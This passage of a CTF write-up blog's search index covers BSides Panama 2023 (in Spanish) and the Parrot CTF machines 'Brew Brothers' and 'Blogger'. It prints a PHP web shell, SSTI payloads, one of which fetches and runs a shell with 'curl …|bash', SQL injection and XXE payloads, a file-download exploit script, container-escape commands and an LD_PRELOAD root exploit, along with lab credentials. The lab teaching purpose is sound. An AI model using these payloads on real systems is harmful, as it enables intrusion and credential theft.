highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&lt;?php system($_REQUEST['cmd']); ?&gt;\n</code></pre></div></div>\n\n<p>Al abrir la imagen(<strong>que en realidad es el archivo php malicioso</strong>) y colocar <code class=\"language-plaintext highlighter-rouge\">?cmd=whoami</code> podemos ejecutar comandos y también ganar acceso al sistema.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/11.png\" width=\"600\" /></p>\n\n<p>Creamos un index.html en nuestra máquina de atacante para hacer la reverse shell.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/12.png\" width=\"600\" /></p>\n\n<p>Después compartimos el index.html con python3 y nos ponemos en escucha con <a>netcat</a>:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/13.png\" width=\"600\" /></p>\n\n<p>Ahora para obtener la reverse shell nos falta hacer lo siguiente:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/14.png\" width=\"600\" /></p>\n\n<p>Estamos dentro como <code class=\"language-plaintext highlighter-rouge\">www-data</code>, hacemos tratamiento de la TTY y listo.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/15.png\" width=\"600\" /></p>\n\n<p>Enumeramos el sistema y con <a>ss -nat</a> nos damos cuenta de que hay un puerto que no podíamos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en <a>notes.txt</a>.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/16.png\" width=\"600\" /></p>\n\n<p>Realizamos un túnel con <a>chisel</a> para tener acceso a ese puerto desde nuestra máquina.</p>\n\n<p>En nuestra máquina lo ponemos así: (<strong>Servidor</strong>)</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/17.png\" width=\"600\" /></p>\n\n<p>En la sesión de www-data lo ponemos de la siguiente manera: (<strong>Cliente</strong>)</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/18.png\" width=\"600\" /></p>\n\n<p>Ahora nos dirigimos a nuestro navegador y podemos colocar <a>127.0.0.1:8080</a> y nos aparecerá el servicio que vimos en <a>notes.txt</a>.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/19.png\" width=\"600\" /></p>\n\n<p>Si le ponemos el argumento <a>/?q=</a> y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un <a>7*7</a> el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS):</p>\n\n<p><a>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/20.png\" width=\"600\" /></p>\n\n<p>Para probarlo más podemos utilizar el siguiente payload:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\n</code></pre></div></div>\n\n<p>Y en efecto nos devuelve el <a>/etc/passwd</a>, pero no de la máquina en la cual tenemos acceso con <strong>www-data</strong> es otra máquina, investigando un poco más nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>{root.process.mainModule.require('child_process').spawnSync('cat', ['/root/backup.sql']).stdout}\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/bsides-panama-2023/21.png\" width=\"600\" /></p>\n\n<p>Obtenemos la flag y un usuario y contraseña la cual son:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1\n\nDecodificamos el sha256 y obtenemos lo siguiente:\n\nadmin:R@scal\n</code></pre></div></div>\n\n<h1 id=\"acceso-usuario-webserver\">Acceso usuario (WebServer):</h1>\n\n<p>Podemos utilizar estas credenciales para entrar al servidor por ssh.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/22.png\" width=\"600\" /></p>\n\n<p>Además podemos ver la flag:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/23.png\" width=\"600\" /></p>\n\n<h1 id=\"acceso-administrativo-webserver-ruta-alternativa\">Acceso administrativo (WebServer): (ruta alternativa)</h1>\n\n<p>Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>{root.process.mainModule.require('child_process').exec('curl 172.16.80.42|bash')}\n</code></pre></div></div>\n\n<p>Tenemos que tener todo <strong>exactamente igual</strong> que cuando ganamos acceso con al WebShell.</p>\n\n<p>Hacemos el tratamiento de la TTY y listo.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/24.png\" width=\"600\" /></p>\n\n<p>Estamos como root y en la dirección IP <a>172.17.0.2</a></p>\n\n<p>Enumeramos el contenedor y encontramos que podemos utilizar la siguiente información para leer archivos del sistema como usuario privilegiado:</p>\n\n<p><a>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod</a></p>\n\n<p><a>https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames</a> (La parte de escalada de privilegios)</p>\n\n<p>Podemos explotar la capabilitie mknod del contenedor:</p>\n\n<p>En el contenedor ejecutamos lo siguiente:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>cd /\nmknod sda b 8 0\nchmod 777 sda\necho \"admin:x:1000:1000:admin,,,:/home/admin:/bin/bash\" &gt;&gt; /etc/passwd\nsu admin --&gt; Ejecutando este comando deberíamos pasar al usuario node\n/bin/bash\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/bsides-panama-2023/25.png\" width=\"600\" /></p>\n\n<p>En la máquina víctima como usuario admin ejecutamos lo siguiente:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ps -auxf | grep /bin/bash --&gt; Para saber cuál es el PID.\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/bsides-panama-2023/26.png\" width=\"600\" /></p>\n\n<p>Ahora que tenemos el PID en este caso <a>2676</a> nos falta obtener la flag:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>grep -a \"root -\" /proc/2676/root/sda --&gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando:\n\nstrings /proc/2676/root/sda | grep -a \"root -\"\n</code></pre></div></div>\n\n<p>Obtenemos la flag:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/27.png\" width=\"600\" /></p>\n\n<h1 id=\"wordpress-webserver-ruta-alternativa\">WordPress (WebServer): (ruta alternativa)</h1>\n\n<p>Hay múltiples maneras de obtener esta flag, pero se me hizo muy fácil de esta manera:</p>\n\n<p>Tenemos acceso como root a mysql sin proporcionar contraseña:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>mysql -uroot -p --&gt; Cuando nos pide un password presionamos enter.\n\nshow databases; \n\nuse wordpress;\n\nselect * from wp_posts where post_status='trash'; --&gt; Podemos ver posts que han sido borrados.\n</code></pre></div></div>\n\n<p>En WordPress, la papelera se gestiona en la base de datos de WordPress, específicamente en la tabla <a>wp_posts</a>, cuando se elimina una publicación, su estado se cambia a papelera en la columna <a>post_status</a> de la <a>tabla wp_posts</a>, y permanece allí hasta que se elimine permanentemente o se restaure. La tabla wp_posts también contiene columnas para el título, el contenido, el autor y otra información meta de la publicación.</p>\n\n<p>Podemos ver la flag:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/28.png\" width=\"600\" /></p>\n\n<h1 id=\"passwordtxt-webserver2\">Password.txt (WebServer2)</h1>\n\n<p>Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no podíamos descubrirlo atrevés de ping, pero si pudimos encontrarlo gracias a los puertos.</p>\n\n<p>Ahora que sabemos que dirección IP tiene podemos hacer un escaneo más profundo con <a>nmap</a> y podemos encontrar los siguientes puertos:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/29.png\" width=\"600\" /></p>\n\n<p>Empezamos enumerando el puerto <strong>8080</strong>, y aplicamos fuzzing con el siguiente comando:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ\n</code></pre></div></div>\n\n<p>Después de esperar un buen rato podemos ver este directorio datos.</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/30.png\" width=\"600\" /></p>\n\n<p>Esto es lo que contiene el directorio:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/31.png\" width=\"600\" /></p>\n\n<p>Buscamos en internet “<a>iotransfer windows exploit</a>” nos topamos con este artículo:</p>\n\n<p><a>https://www.exploit-db.com/exploits/50974</a></p>\n\n<p>Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el código, en mi caso no sirvió por un problema de incompatibilidad con la librería win32com, así que revisando el código podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aquí esta el código: (<code class=\"language-plaintext highlighter-rouge\">Funcional en Linux</code>)</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>#!/bin/python3\n\nimport requests, json\n\nremoteDownloadPath = r'C:\\Users\\frank\\Desktop\\password.txt'\nIP = \"\"\nlocalDownloadPath =\"./password.txt\"\n\ndef CreateDownloadTask(IP, Path) -&gt; str:\n    url = f'http://{IP}:7193/index.php?action=createtask'\n    task = {\n        'method': 'get',\n        'version': '1',\n        'userid': '*',\n        'taskstate': '0',\n        'filepath': Path\n    }\n    res = requests.post(url, json=task)\n    task = json.loads(res.content)\n    task = json.loads(task['content'])\n    taskid = task['taskid']\n    print(f\"TaskID: {taskid}\")\n    return taskid\n\ndef ExploitDownload(IP, DownloadPath, ID=None):\n    if ID:\n        url = f'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}'\n    else:\n        taskid = CreateDownloadTask(IP, DownloadPath)\n        url = f'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}'\n    res = requests.get(url)\n    return \n\nif __name__ == '__main__':\n        print(f\"[*] Downloading the file: {remoteDownloadPath}\")\n        res = ExploitDownload(IP, remoteDownloadPath)\n        file = open(localDownloadPath, \"wb+\")\n        file.write(res.content)\n        file.close()\n</code></pre></div></div>\n\n<p>Lo ejecutamos y obtenemos lo siguiente:</p>\n\n<p><img src=\"/assets/img/bsides-panama-2023/32.png\" width=\"600\" /></p>\n\n<h1 id=\"acceso-usuario-webserver2\">Acceso usuario (WebServer2):</h1>\n\n<p>Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(<strong>10.1.1.100</strong>) y webserver2(<strong>10.1.1.150</strong>).</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389</code></p>\n\n<p>Para conectarnos podemos utilizar: <a>xfreerdp</a> o <a>remmina</a>.</p>\n\n<p>En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 después de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio.</p>\n\n<h1 id=\"acceso-administrativo-webserver2\">Acceso administrativo (WebServer2):</h1>\n\n<p>Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(<code class=\"language-plaintext highlighter-rouge\">Está corriendo los servicios Web en los puertos 8080 y 8081</code>), nos dirigimos al directorio <code class=\"language-plaintext highlighter-rouge\">C:\\xampp2\\htdocs\\</code> y subimos una reverse shell para después ejecutarla desde la página web y si vemos quien la esta ejecutando es <code class=\"language-plaintext highlighter-rouge\">WEBSERVER\\Administrator</code> así que ya podemos buscar la flag del administrador.</p>\n\n<h1 id=\"plataforma-web-webserver2-ruta-alternativa\">Plataforma WEB (WebServer2) (ruta alternativa):</h1>\n\n<p>Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos.</p>\n\n<p>Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprendí muchas cosas.</p>\n\n"
      } ,
    
      {
        "title"    : "Brew Brothers",
        "category" : "Parrot-CTF",
        "tags"     : "Parrot-CTF, Easy",
        "url"      : "/parrot-ctf/Brew-Brothers",
        "date"     : "2023-06-03 00:00:00 -0500",
        "content": "<p><img src=\"/assets/img/BrewBrothers/1.jpg\" width=\"800\" /></p>\n\n<p><a href=\"https://parrot-ctfs.com/\">🦜 Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>\n\n<p>This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges.</p>\n\n<h1 id=\"content\">Content:</h1>\n\n<ul>\n  <li><a href=\"#enumeration-\">Enumeration</a></li>\n  <li><a href=\"#sqli-\">SQLI</a></li>\n  <li><a href=\"#privilege-escalation-\">Privilege escalation</a></li>\n</ul>\n\n<h1 id=\"enumeration-\">Enumeration 🔎:</h1>\n\n<p>We start by using <code class=\"language-plaintext highlighter-rouge\">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p>\n\n<p><img src=\"/assets/img/BrewBrothers/2.png\" width=\"600\" /></p>\n\n<p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href=\"https://ostechnix.com/identify-operating-system-ttl-ping/\">Identify OS using TTL value</a>.</p>\n\n<p>Now, let’s go with an nmap scan to view the open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts</code></p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-p-</code> –&gt; We are doing a scan against all 65535 ports to search for open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--open</code> –&gt; It will only report open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-sS</code> –&gt; It can be performed quickly, scanning thousands of ports per second.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--min-rate 5000</code> –&gt; It sets the minimum rate of packets sent per second to 5000.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-n</code> –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-v</code> –&gt; It will be verbose in its output.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-Pn</code> –&gt; This option skips the host discovery stage.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-oN</code> –&gt; It will save the output in a file called “allPorts”.</p>\n\n<p>We find out the following open ports:</p>\n\n<p><img src=\"/assets/img/BrewBrothers/3.png\" width=\"600\" /></p>\n\n<p>Let’s take a look at what the page has.</p>\n\n<p><img src=\"/assets/img/BrewBrothers/4.png\" width=\"600\" /></p>\n\n<p>Well… nothing, it is a default page of apache2, so let’s start fuzzing.</p>\n\n<p>You can use whatever fuzzing tool you want, in my case I am going to use <code class=\"language-plaintext highlighter-rouge\">wfuzz</code>.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/FUZZ</code></p>\n\n<p>We are doing a simple fuzzing to find directories and we find website that seems interesting.</p>\n\n<p><img src=\"/assets/img/BrewBrothers/5.png\" width=\"600\" /></p>\n\n<p>There is an <code class=\"language-plaintext highlighter-rouge\">about.html</code> page, but it is not interesting.</p>\n\n<p>So let’s start fuzzing again but this time let’s search for <code class=\"language-plaintext highlighter-rouge\">.html</code> pages.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.14.0.32/website/FUZZ.html</code></p>\n\n<p>We found these: <code class=\"language-plaintext highlighter-rouge\">contact.html</code> and <code class=\"language-plaintext highlighter-rouge\">search.html</code>.</p>\n\n<p>The <code class=\"language-plaintext highlighter-rouge\">contact.html</code> page doesn’t appear to have any functional or reflected elements where we can inject something.</p>\n\n<p>However the <code class=\"language-plaintext highlighter-rouge\">search.html</code> page is interesting because is trying to get data from something so we can try to test for SQLI.</p>\n\n<h1 id=\"sqli-\">SQLI 💉:</h1>\n\n<p>So how can we know if this is vulnerable to a SQL injection?, let’s do a simple injection like <a>’ OR 1=1– -</a> if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists.</p>\n\n<p><img src=\"/assets/img/BrewBrothers/6.png\" width=\"400\" /></p>\n\n<p>Yeah! there is a result of all the entries that are in the actual db.</p>\n\n<p>Let’s start doing more injections 💉:</p>\n\n<p>This is to view which fields of output we have control over.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">' union select 1,2-- -</code></p>\n\n<p><img src=\"/assets/img/BrewBrothers/7.png\" width=\"100\" /></p>\n\n<p>This is to view all the available databases. There, we can see an interesting database name, which is <a>creds</a>.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>' union select 1,group_concat(schema_name) from information_schema.schemata-- -\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/BrewBrothers/8.png\" width=\"500\" /></p>\n\n<p>With this, we can view the table names of the database, and there is only one table, which is named <code class=\"language-plaintext highlighter-rouge\">credentials</code>.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>' union select 1,group_concat(table_name) from information_schema.tables where table_schema=\"creds\"-- -\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/BrewBrothers/9.png\" width=\"180\" /></p>\n\n<p>With this, we can see the column names, which are <code class=\"language-plaintext highlighter-rouge\">username</code> and <code class=\"language-plaintext highlighter-rouge\">password</code>.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>' union select 1,group_concat(column_name) from information_schema.columns where table_schema=\"creds\" and table_name=\"credentials\"-- -\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/BrewBrothers/10.png\" width=\"300\" /></p>\n\n<p>So know that we have enumerating the db let’s retrive all the usernames and passwords.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>' union select 1,group_concat(username,\":\",password) from creds.credentials-- -\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/BrewBrothers/11.png\" width=\"300\" /></p>\n\n<p>With this we can retrive only one credential that is: charles:pyvzngr</p>\n\n<p>You can learn to do this injections <a href=\"https://book.hacktricks.xyz/pentesting-web/sql-injection\">here</a>, and remember there is a lot of material out there for you to learn more about SQLI.</p>\n\n<p>So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user “<strong>charles</strong>”.</p>\n\n<h1 id=\"privilege-escalation-\">Privilege escalation 🚩:</h1>\n\n<p>Now that we are inside the machine you need to do some things to ensure smooth operation:</p>\n\n<ol>\n  <li><code class=\"language-plaintext highlighter-rouge\">bash</code></li>\n  <li><code class=\"language-plaintext highlighter-rouge\">export TERM=xterm</code></li>\n</ol>\n\n<p>This will allow us to clean the screen with <code class=\"language-plaintext highlighter-rouge\">ctrl + l</code>.</p>\n\n<p>We need to enumerate the system to find a way to escalate privileges.</p>\n\n<p>One thing I always check first is <code class=\"language-plaintext highlighter-rouge\">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>\n\n<p>More info about privilege escalation check <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation\">here</a>.</p>\n\n<p><img src=\"/assets/img/BrewBrothers/12.png\" width=\"600\" /></p>\n\n<p>We can see that we can execute a python3 script like root user but we can’t edit it :(</p>\n\n<p><img src=\"/assets/img/BrewBrothers/13.png\" width=\"600\" /></p>\n\n<p>The script basically hashes a random value and writes it to a file. It doesn’t seem to be useful, but we can see that it imports various libraries.</p>\n\n<p>The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this:</p>\n\n<p><img src=\"/assets/img/BrewBrothers/14.png\" width=\"600\" /></p>\n\n<p>Now, the only thing we need to do to become root is to execute the script with sudo privileges.</p>\n\n<p><img src=\"/assets/img/BrewBrothers/15.png\" width=\"600\" /></p>\n\n<p>Hope you like it and learn something new :)</p>\n"
      } ,
    
      {
        "title"    : "Blogger",
        "category" : "Parrot-CTF",
        "tags"     : "Parrot-CTF, Easy",
        "url"      : "/parrot-ctf/Blogger",
        "date"     : "2023-08-14 00:00:00 -0500",
        "content": "<p><img src=\"/assets/img/blogger/1.png\" width=\"800\" /></p>\n\n<p><a href=\"https://parrot-ctfs.com/\">🦜 Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>\n\n<p>This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges.</p>\n\n<h1 id=\"content\">Content:</h1>\n\n<ul>\n  <li><a href=\"#enumeration-\">Enumeration</a></li>\n  <li><a href=\"#xxe-\">XXE</a></li>\n  <li><a href=\"#privilege-escalation-\">Privilege escalation</a></li>\n</ul>\n\n<h1 id=\"enumeration-\">Enumeration 🔎:</h1>\n\n<p>We start by using <code class=\"language-plaintext highlighter-rouge\">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p>\n\n<p><img src=\"/assets/img/blogger/2.png\" width=\"600\" /></p>\n\n<p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href=\"https://ostechnix.com/identify-operating-system-ttl-ping/\">Identify OS using TTL value</a>.</p>\n\n<p>Now, let’s go with an nmap scan to view the open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts</code></p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-p-</code> –&gt; We are doing a scan against all 65535 ports to search for open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--open</code> –&gt; It will only report open ports.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-sS</code> –&gt; It can be performed quickly, scanning thousands of ports per second.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">--min-rate 5000</code> –&gt; It sets the minimum rate of packets sent per second to 5000.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-n</code> –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-v</code> –&gt; It will be verbose in its output.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-Pn</code> –&gt; This option skips the host discovery stage.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">-oN</code> –&gt; It will save the output in a file called “allPorts”.</p>\n\n<p>We find out the following open ports:</p>\n\n<p><img src=\"/assets/img/blogger/3.png\" width=\"600\" /></p>\n\n<p>Let’s take a look at what the page has.</p>\n\n<p><img src=\"/assets/img/blogger/3.png\" width=\"600\" /></p>\n\n<p>Let’s take a look at what the page has.</p>\n\n<p><img src=\"/assets/img/blogger/4.png\" width=\"600\" /></p>\n\n<p>Well, we can’t see any of the posts because we get a 404 error, but we can see something interesting, a search button.</p>\n\n<h1 id=\"xxe-\">XXE 💉:</h1>\n\n<p>Let’s take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis.</p>\n\n<p><img src=\"/assets/img/blogger/5.png\" width=\"600\" /></p>\n\n<p>I tried SQL injection payloads, but they didn’t work. So, I tried different combinations of other payloads and saw this interesting response.</p>\n\n<p><img src=\"/assets/img/blogger/6.png\" width=\"600\" /></p>\n\n<p>Basically, our input is being placed as a XML structure, sooo maybe a <a href=\"https://portswigger.net/web-security/xxe\">XXE (XML External Entity)</a> injection?? let’s check it out.</p>\n\n<p>We can search for payloads in <a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe\">PayloadAllTheThings</a> and I used the clasic XXE to retrieve files.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;\n</code></pre></div></div>\n\n<p><a>IMPORTANT</a>: You need to url encode the ampersand (<code class=\"language-plaintext highlighter-rouge\">&amp;</code>) cause if you don’t, it will not work. It should be <code class=\"language-plaintext highlighter-rouge\">%26</code>.</p>\n\n<p>It works, now searching for the word <a>bash</a> we can see two users <code class=\"language-plaintext highlighter-rouge\">jimmy</code> and <code class=\"language-plaintext highlighter-rouge\">root</code>.</p>\n\n<p>Now we can search for configuration files, enumerate internal ports, and so on. But let’s focus on enumerating the web page more.</p>\n\n<p>We can do fuzzing to the web page to search for directories with tools like: <code class=\"language-plaintext highlighter-rouge\">gobuster</code>, <code class=\"language-plaintext highlighter-rouge\">wfuzz</code>, <code class=\"language-plaintext highlighter-rouge\">ffuf</code>, <code class=\"language-plaintext highlighter-rouge\">dirsearch</code>… but I am going to use dirsearch in this case.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">dirsearch -u http://10.14.0.12/</code></p>\n\n<p>And we found the <code class=\"language-plaintext highlighter-rouge\">/management</code> directory:</p>\n\n<p><img src=\"/assets/img/blogger/7.png\" width=\"600\" /></p>\n\n<p>We found this note in: <code class=\"language-plaintext highlighter-rouge\">/management/admins/temp</code></p>\n\n<p><img src=\"/assets/img/blogger/8.png\" width=\"600\" /></p>\n\n<p>We found this other note in: /management/employees/jimmy the same user that we saw earlier.</p>\n\n<p><img src=\"/assets/img/blogger/9.png\" width=\"600\" /></p>\n\n<p>A id_rsa file in <code class=\"language-plaintext highlighter-rouge\">/home/jimmy/ssh/id_rsa.bak</code>?? 😳, let’s try to search the file with the XXE vulnerability.</p>\n\n<p><img src=\"/assets/img/blogger/10.png\" width=\"600\" /></p>\n\n<p>Well with this we can log to the system as the user jimmy with <code class=\"language-plaintext highlighter-rouge\">ssh</code>, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to <code class=\"language-plaintext highlighter-rouge\">400</code> with <code class=\"language-plaintext highlighter-rouge\">chmod 400 id_rsa</code>, and now connect with it:</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">ssh -i id_rsa jimmy@10.14.0.12</code></p>\n\n<p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p>\n\n<ol>\n  <li><code class=\"language-plaintext highlighter-rouge\">export TERM=xterm</code></li>\n</ol>\n\n<p>This will allow us to clean the screen with <code class=\"language-plaintext highlighter-rouge\">ctrl + l</code>.</p>\n\n<p><img src=\"/assets/img/blogger/11.png\" width=\"300\" /></p>\n\n<p>Now we can see the flag 🎉.</p>\n\n<h1 id=\"privilege-escalation-\">Privilege escalation 🚩:</h1>\n\n<p>We need to enumerate the system to find a way to escalate privileges.</p>\n\n<p>One thing I always check first is <code class=\"language-plaintext highlighter-rouge\">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p>\n\n<p>More info about privilege escalation techniques check <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation\">here</a>.</p>\n\n<p><img src=\"/assets/img/blogger/12.png\" width=\"600\" /></p>\n\n<p>We can see something interesting: <a>env_keep+=LD_PRELOAD</a>.</p>\n\n<p>A quick search in Google tells us that we can escalate privileges with it.</p>\n\n<p>We can go to <code class=\"language-plaintext highlighter-rouge\">/tmp</code> directory and create a exploit like this:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid _init() {\n\tunsetenv(\"LD_PRELOAD\");\n\tsetgid(0);\n\tsetuid(0);\n\tsystem(\"/bin/bash\");\n}\n</code></pre></div></div>\n\n<p>Save the file as <code class=\"language-plaintext highlighter-rouge\">whatever.c</code> and to compile it with:</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">gcc -fPIC -shared -o whatever.so whatever.c -nostartfiles</code></p>\n\n<p>This will create a <code class=\"language-plaintext highlighter-rouge\">whatever.so</code> file that we need it to execute:</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">sudo LD_PRELOAD=/tmp/whatever.so /usr/bin/ping</code></p>\n\n<p>And now we are root :)</p>\n\n<p><img src=\"/assets/img/blogger/13.png\" width=\"200\" /></p>\n\n<p>Hope you like it and learn something new :)</p>\n"
      } ,
    
      {
        "title"    : "Pet Shop",
        "category" : "Parrot-CTF",
        "tags"     : "Parrot-CTF, Easy",
        "url"      : "/parrot-ctf/Pet-shop",
        "date"     : "2023-08-19 00:00:00 -0500",
